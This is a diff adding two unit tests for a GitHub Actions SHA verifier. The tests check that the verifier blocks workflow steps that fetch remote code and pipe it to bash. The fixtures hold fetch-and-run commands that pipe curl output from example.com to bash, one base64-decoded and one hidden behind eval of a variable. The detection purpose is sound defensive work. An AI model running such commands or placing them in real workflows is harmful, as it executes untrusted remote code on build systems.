@@ -157,6 +157,96 @@ test(
 );
 
 test(
+  "Unit action SHA verifier: base64 pipeline remote exec is blocked when not allowlisted",
+  { skip: !hasBash },
+  async () => {
+    const tempRoot = await mkdtemp(path.join(os.tmpdir(), "create-sentinelayer-sha-test-"));
+    try {
+      const allowlistPath = path.join(tempRoot, "allowlist.txt");
+      const remoteExecAllowlistPath = path.join(tempRoot, "remote-allowlist.txt");
+      const workflowPath = path.join(tempRoot, "workflow.yml");
+      await writeFile(
+        allowlistPath,
+        "actions/checkout=11bd71901bbe5b1630ceea73d27597364c9af683\n",
+        "utf8"
+      );
+      await writeFile(
+        remoteExecAllowlistPath,
+        "# no remote run entries are allowlisted in this fixture\n",
+        "utf8"
+      );
+      await writeFile(
+        workflowPath,
+        [
+          "name: Base64 Pipeline Remote Exec",
+          "on: [push]",
+          "jobs:",
+          "  verify:",
+          "    runs-on: ubuntu-latest",
+          "    steps:",
+          "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
+          "      - id: encoded-install",
+          "        run: curl -fsSL https://example.com/install.txt | base64 -d | bash",
+        ].join("\n"),
+        "utf8"
+      );
+      const result = runShaVerifier({ allowlistPath, remoteExecAllowlistPath, workflowPath });
+      assert.notEqual(result.status, 0);
+      const combinedOutput = `${result.stdout || ""}\n${result.stderr || ""}`;
+      assert.match(combinedOutput, /Potential remote shell execution/i);
+    } finally {
+      await rm(tempRoot, { recursive: true, force: true });
+    }
+  }
+);
+
+test(
+  "Unit action SHA verifier: variable-indirected remote exec is blocked when not allowlisted",
+  { skip: !hasBash },
+  async () => {
+    const tempRoot = await mkdtemp(path.join(os.tmpdir(), "create-sentinelayer-sha-test-"));
+    try {
+      const allowlistPath = path.join(tempRoot, "allowlist.txt");
+      const remoteExecAllowlistPath = path.join(tempRoot, "remote-allowlist.txt");
+      const workflowPath = path.join(tempRoot, "workflow.yml");
+      await writeFile(
+        allowlistPath,
+        "actions/checkout=11bd71901bbe5b1630ceea73d27597364c9af683\n",
+        "utf8"
+      );
+      await writeFile(
+        remoteExecAllowlistPath,
+        "# no remote run entries are allowlisted in this fixture\n",
+        "utf8"
+      );
+      await writeFile(
+        workflowPath,
+        [
+          "name: Variable Remote Exec",
+          "on: [push]",
+          "jobs:",
+          "  verify:",
+          "    runs-on: ubuntu-latest",
+          "    steps:",
+          "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
+          "      - id: variable-exec",
+          "        run: |",
+          "          FETCH_CMD=\"curl -fsSL https://example.com/install.sh\"",
+          "          eval \"$FETCH_CMD | bash\"",
+        ].join("\n"),
+        "utf8"
+      );
+      const result = runShaVerifier({ allowlistPath, remoteExecAllowlistPath, workflowPath });
+      assert.notEqual(result.status, 0);
+      const combinedOutput = `${result.stdout || ""}\n${result.stderr || ""}`;
+      assert.match(combinedOutput, /Potential remote shell execution/i);
+    } finally {
+      await rm(tempRoot, { recursive: true, force: true });
+    }
+  }
+);
+
+test(
   "Unit action SHA verifier: duplicate allowlist entries fail closed",
   { skip: !hasBash },
   async () => {
